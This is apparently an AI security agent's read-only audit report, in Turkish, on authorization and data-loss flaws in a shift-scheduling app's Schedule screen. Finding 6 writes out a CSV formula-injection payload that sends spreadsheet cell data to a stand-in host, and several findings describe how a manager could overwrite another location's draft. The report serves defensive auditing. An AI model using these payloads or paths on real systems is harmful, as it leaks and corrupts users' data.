<!-- EKRAN-01 Schedule keşfi, parça B (nf-guvenlik, salt okuma), main 06a74d5a, 2026-10-05. Ajanın raporu olduğu gibi. -->

DENETİM SONUCU: Bugün kritik ya da yüksek bulgu yok. 5 orta, 4 düşük bulgu var. İkisi bilinen bir backlog maddesinin hâlâ açık kalan parçası; kalanlar ya yeni ya da var olan bir maddeye bağlı (`main` @`06a74d5a`).

Yöntem: kodu, yerel veritabanındaki gerçek fonksiyon tanımlarını ve RLS politikalarını okudum. Yerel DB main ile aynı sürümde (son migration `20261007030000`, ölçtüm). Hiçbir şey yazmadım; geri alınan deneme bile yapmadım. Bu yüzden 1 ve 4. bulgular kod okumasına dayanıyor, canlı denenmedi.

## Bulgular

**1. Orta: Başka lokasyonun taslağına kaydedilebiliyor.** Bilinen madde BL-276'nın 3. parçası, hâlâ açık.
- **Ne:** Taslak kaydetme ("Save draft"), hedef taslak kimliğinin kişinin kendi düzenlemesine ait olup olmadığına ya da taslağın lokasyonlarının kişinin kapsamında olup olmadığına bakmıyor. Fonksiyonda kapsam değişkeni var ama yalnız "geçmiş hafta / başlamış vardiya" uyarılarında kullanılıyor.
- **Nerede:** `save_schedule_edit_session_service`, `supabase/migrations/20260926150000_one_function_per_schedule_job.sql:1429-1456`
- **Örnek:**
  - Beşiktaş müdürü Can, Kadıköy müdürü Ayşe'nin yalnız Kadıköy'ü kapsayan taslağının kimliğini öğrenir (yol 2. bulguda).
  - Kendi Beşiktaş düzenlemesini o taslağa kaydeder. Revizyon küçük bir sayı; birkaç denemede tutar.
  - Sonuç: Ayşe'nin taslağının adı değişir ve taslağa Beşiktaş eklenir. Ayşe'nin açık düzenlemesi kaydederken "draft revision stale" hatası alır.
  - En kötüsü: çok lokasyonlu taslağı yalnız hepsinin müdürü sildiği için Ayşe kendi taslağını artık silemez.
  - Can Kadıköy vardiyalarını göremez; veri okunmuyor, bozuluyor.
- **Düzeltme:** `nf-db`. Hedef taslak ya düzenlemenin açıldığı taslak olmalı ya da yetki çekirdeğine taslağın lokasyonlarıyla sorulmalı.
- **Önemli:** Bugünkü SEC-YAYIN-HAZIRLIK raporu bu parçayı "çekirdeğe geçmiş" saymış. Bu yanlış: hüküm, fonksiyonda kapsam çağrısının bulunmasına dayanmış, yazma yolu süzülmüyor.
- `(leave: medium / do: moderate)`

**2. Orta: Schedule canlı yenileme kanalı yetki çekirdeğinin dışında; çalışanlar da dinleyebiliyor.** YENİ.
- **Ne:**
  - Bu kanal, açık Schedule ekranlarına "yenile" yayını gönderiyor ve bütün workspace için tek. Politikası eski yardımcıyı (`workspace_has_permission`) kullanıyor.
  - Bu yardımcı çalışana evet diyor. Çekirdek aynı kişiye "izni yok" diyor. Üç çalışanla ölçtüm: kanal "evet", çekirdek "missing_permission".
  - Lokasyon süzgeci de yok. Yayının içinde taslak kimliği, düzenleyenin kullanıcı kimliği, lokasyon kimlikleri ve değişen vardiya kimlikleri var.
  - Lokasyonda kimin ekranı açık olduğunu gösteren kanalı (presence) da aynı eski yardımcı koruyor. Lokasyondaki çalışan bu kanala katılıp istediği içeriği yazabiliyor; örneğin "Zeynep düzenliyor" görüntüsü sahtelenebilir.
- **Nerede:**
  - Politika: `supabase/migrations/20260923173708_schedule_presence_join_reads_broadcast.sql:15`
  - Yayın: `apps/api/src/schedule/schedule-service.ts:1284-1301`, taslak kimliği `:607`, `:710`
- **Örnek:** Can Beşiktaş'tan bu kanalı dinliyor. Ayşe Kadıköy taslağını kaydettiği anda taslağın kimliğini görür; 1. bulgu böylece somutlaşıyor. Kadıköy'de çalışan Ali de müdürlerin ne zaman düzenleme yaptığını izleyebilir.
- **Düzeltme:**
  - `nf-db`: politikalar çekirdeğe sorsun (`rls_can` ile `schedule.read`); kanal lokasyon bazlı olsun.
  - `nf-backend`: yayından taslak kimliği ve kullanıcı kimliği çıksın.
- `(leave: medium / do: moderate)`

**3. Orta: Kapsamı daralan müdürün açık düzenlemesi yaşamaya devam ediyor.** BL-276'nın 3. parçası, açık.
- **Ne:** Düzenlemeyi canlı tutan sinyal, düzenlemeyi okuma ve kaydetme yalnız "düzenlemeyi açan bu kişi mi" diye bakıyor; yetkiyi yeniden sormuyor. Rol değişikliği, lokasyondan çıkarma ya da üyelikten çıkarma açık düzenlemeleri kapatmıyor; ölçtüm, düzenlemeyi kapatan fonksiyonların hiçbiri bunlar değil.
- **Nerede:** `heartbeat_schedule_edit_session_service` (`20260818220000_schedule_edit_sessions.sql:424`), `get_schedule_edit_session_service`, kaydetme (`:1453` civarı, düzenlemedeki bütün vardiyaları süzmeden yazıyor)
- **Örnek:** Ayşe Kadıköy ve Erenköy müdürü, Kadıköy'den çıkarılıyor. Sekmesi açık kaldıkça Kadıköy vardiyalarını ve notlarını okumaya, onları bir taslağa kaydetmeye devam eder. Yayınlayamaz, çünkü yayın lokasyon lokasyon soruyor.
- Tamamen çıkarılan ya da çalışana düşürülen kişiyi API kapısı zaten durduruyor.
- **Düzeltme:** `nf-db`. Bu üç fonksiyon düzenlemenin lokasyonlarının hâlâ kişinin kapsamında olduğunu sorsun, değilse düzenlemeyi kapatsın.
- `(leave: medium / do: safe)`

**4. Orta: Şablonu "Overwrite" ile uygulamak başlamış vardiyaları onaysız siliyor.** YENİ, veri kaybı.
- **Ne:**
  - Tek vardiya silinince yayınlanmış vardiya "silinecek" diye işaretleniyor.
  - Kaydederken "has already started" onayı bu işarete bakıyor, müsaitlik istisnaları da iptal ediliyor.
  - Overwrite ise satırları doğrudan siliyor. İşaret kalmadığı için onay hiç sorulmuyor; kilitli yayın kopyası da korunmuyor.
- **Nerede:** `apply_schedule_template_service`, `20260927160000_management_and_owner_are_kept.sql:1325`
- **Örnek:** Salı 14:00, Ali'nin bugünkü 9-17 vardiyası başlamış. Ayşe bu haftaya şablonu Overwrite ile uygular, kaydeder, yayınlar. Ali'nin başlamış vardiyası programdan uyarısız düşer; yayın penceresinde yalnız "removed" sayısı görünür. İlke P09'a aykırı.
- **Düzeltme:** `nf-db`. Overwrite yayınlanmış kopyaları toplu silme gibi "silinecek" diye işaretlesin, ya da başlamış vardiyalara dokunmasın.
- `(leave: medium / do: moderate)`

**5. Orta: Export penceresinin izin kontrolü kendi kuralını API rotasında yürütüyor.** YENİ, BL-374 ve BL-565 ile aynı aile.
- **Ne:**
  - `POST …/schedule/export-v2/authorize` çekirdek yerine kendi izin listesine ve "rol employee mi" kontrolüne bakıyor; kapsamı da TypeScript'te hesaplıyor.
  - Üye olmayana 404 yerine 403 dönüyor ("hayır" sözleşmesi sapması).
  - Web bu rotayı kullanıyor (`apps/web/src/schedule/schedule-data.ts:77`).
- **Nerede:** `apps/api/src/schedule/schedule-export-v2-routes.ts:15-58`
- **Etki:** Bugün veri sızdırmıyor, çünkü dışa aktarmanın içeriği zaten veritabanında süzülen okumalardan geliyor. Ama ikinci bir yetki yolu ve CLAUDE.md §9'un açıkça yasakladığı biçim.
- **Düzeltme:** `nf-backend`, çekirdek eylemi (`schedule.export`) ve çekirdeğe sorulan bir kontrol.
- `(leave: medium / do: safe)`

**6. Orta (BL-282'yi yükseltme önerisi): CSV dışa aktarmada formül enjeksiyonu.**
- **Ne:** CSV hücreleri `=`, `+`, `-`, `@` ile başlayan değerleri etkisizleştirmiyor (`apps/api/src/schedule/schedule-export.ts:449-453`).
- **Yeni olan yol:**
  - Workspace'in tercih edilen ad ayarı "auto" ise çalışan kendi adını onaysız değiştirebiliyor (`set_employee_name_settings_service`, 'auto'/'manager'). Ad alanında içerik kontrolü yok, yalnız en çok 80 karakter.
  - Örnek: Ali adını `=HYPERLINK("https://kotu.site/?"&C2,"Ali")` yapar. Ayşe CSV'yi Excel'de açıp tıklayınca hücre verisi dışarı gider.
  - Zamanlanmış e-posta da en çok 10 adrese aynı dosyayı gönderiyor; bu adreslerde kısıt yok, dış adres de olabilir.
- **Düzeltme:** `nf-backend`, tek fonksiyonda düzeltme.
- BL-282'deki "low" işareti medium olmalı. `(leave: medium / do: safe)`

**7. Düşük: Önemli tarih ve kapalı gün okuması kapsamı API'de süzüyor.** YENİ.
- **Ne:** Okuma modeli, önemli tarihleri ve kapalı günleri tam yetkili veritabanı anahtarıyla (service role) okuyup lokasyon süzgecini TypeScript'te uyguluyor. Bugün doğru çalışıyor, not alanı da seçilmiyor. Ama bu satır içi kapsam mantığı (§9).
- **Nerede:** `apps/api/src/schedule/schedule-service.ts:458-528`
- **Düzeltme:** `nf-db`, süzgeç okuma modeli fonksiyonunun içine taşınsın. `(leave: low / do: safe)`

**8. Düşük: Ölü ikiz rotalar; biri veri kaybı tuzağı taşıyor.** BL-280'in 4. parçası.
- **Ne:**
  - `/v1/workspaces/:id/schedule/*` ailesi ve `PATCH /shifts/publish` ölü. `PATCH /shifts/publish`, yayın penceresindeki istisna onaylarını atlıyor.
  - Ek: ölü `/schedule/drafts/:id/auto-fill/preview|apply` rotası, kişinin zaten açık bir düzenlemesi varsa düzenleme açma çağrısı o düzenlemeyi döndürüyor; rota da sonra onu atıyor (discard). Kaydedilmemiş iş gider.
- **Nerede:** `schedule-routes.ts:1421-1545`, `:2395`
- Web bunları çağırmıyor (ölçtüm). **Düzeltme:** `nf-backend`, sil. `(leave: low / do: safe)`

**9. Düşük: Küçük bilgi sızıntıları ve "hayır" sözleşmesi sapmaları.** YENİ, sözleşme kısmı BL-276'nın 5. parçası ailesinde.
- Başkasının taslak kimliğiyle düzenleme açmak, o taslağı düzenleyen müdürün adını döndürüyor (`acquire_schedule_edit_session_service`, "conflict").
- Taslak ve şablon adları workspace genelinde benzersiz; ad çakışmasından başka lokasyonun taslak ve şablon adları yoklanabiliyor.
- İpucusuz 42501 retleri: toplu ekleme "Schedule manage access required", düzenleme dışı lokasyon tetikleyicisi, geri yayından kaldırma "past schedule week is closed".
- **Düzeltme:** `nf-db`. `(leave: low / do: safe)`

## Temiz bulunanlar
- **Yetki ve izinler:**
  - Schedule'daki bütün servis fonksiyonları güvenli arama yoluyla tanımlı (`search_path=""`). Hiçbiri anon ya da authenticated tarafından çağrılamıyor (sorgu sonucu: 0).
  - Schedule tablolarında tarayıcıya hiçbir izin yok; hepsi API üzerinden.
- **Lokasyon kapsamı (M2):**
  - Çekirdek kuralı "hepsini kapsamalı" (`set/write = all`); boş hedef müdüre "hayır" diyor.
  - Vardiya düzenleme her yazmada kapsamı yeniden soruyor.
  - Düzenlemedeki vardiyalar düzenlemenin lokasyonları dışına çıkamıyor (tetikleyici).
  - Yayın her lokasyonu ayrı ayrı soruyor ve yalnız taslağın kapsadığı lokasyonları yayınlıyor. Yayın bildirimi yalnız o yayında vardiyası olana gidiyor.
- **Başka lokasyonun vardiyaları (ghost):** not taşımıyor; yöneticinin müsaitlik notu çekirdeğe soruluyor.
- **Dışa aktarma:**
  - Zamanlanmış e-postada not hiç yok.
  - E-posta kaydı kuranın yetkisiyle çalışıyor; kuran yetkisini kaybedince durduruluyor.
  - Kayıtları kim görür kararı (KARARLAR Q-A) uygulanmış.
  - Yazdırma çıktısında bütün içerik HTML'den kaçırılmış; kâğıt boyu ve yön sabit listeden seçiliyor.
- **Şablonlar:** workspace sınırı ve "lokasyonların hepsi kapsamda" kuralı listede, açmada, yeniden adlandırmada, silmede ve uygulamada var.
- **Eski yardımcılar:** "boş lokasyon = her yer" sayan üç eski yardımcıyı Schedule ekranında hiçbir servis kullanmıyor. Kalan 6 çağıranın hepsi takas ve izin tarafında (ekran 2). Yetki matrisindeki "56 caller" notu bayat. CI'daki "today: allow" TODO'larının Schedule'a etkisi yok.
- **Web:** canlı Schedule kodunda `permissions.includes` yok.

## Kanıt (komutlar ve sonuçları)
- `git log -1` → `06a74d5a`; yerel DB son migration `20261007030000` = repo.
- `pg_proc` taraması: Schedule servisleri `prosecdef=t`, `search_path=""`; anon ve authenticated çağıramıyor (tam liste çıktıda).
- `information_schema.role_table_grants`: `schedule_*` tablolarında authenticated ve anon izni yok. İstisna: `shift_types` ve `shift_labels` Settings'e ait, kapsam dışı.
- Çalışan için kanal ve çekirdek karşılaştırması:
  ```sql
  select service_actor_has_permission(u, ws, 'schedule.read'),
         app_private.authz_reason(u, ws, 'schedule.read', null)
  ```
  Üç çalışanda sonuç `t | missing_permission`.
- `app_private.authz_scope_rules` M2: `set/write = all`, `place/write = all`.
- Düzenlemeyi kapatan fonksiyon listesi: rol, lokasyon ya da üyelik değişikliği yok.

## Ekranda ne değişti
Hiçbir şey; bu bir denetim.

## Sırada ne var (önerilen sıra)
1. **1. ve 2. bulgu birlikte:** kaydetmede hedef taslağı bağla, kanalı çekirdeğe ve lokasyona bağla. Biri ötekini açıyor.
2. **4. bulgu (Overwrite):** veri kaybı, tek fonksiyon.
3. **3. bulgu (düzenlemede yeniden yetki):** 1. bulguyla aynı fonksiyonlara dokunuyor, aynı işte yapılabilir.
4. **5. ve 6. bulgu:** küçük `nf-backend` işleri.
5. **7., 8. ve 9. bulgu:** temizlik.

Hafızama iki kontrol maddesi ekledim:
- `C:\Users\TheWe\Documents\Codex\newfork-clean\.claude\agent-memory\nf-guvenlik\checklist-grep-count-and-id-leak.md`
- `C:\Users\TheWe\Documents\Codex\newfork-clean\.claude\agent-memory\nf-guvenlik\checklist-bulk-path-skips-single-guards.md`

İndeks `MEMORY.md`'de güncellendi.
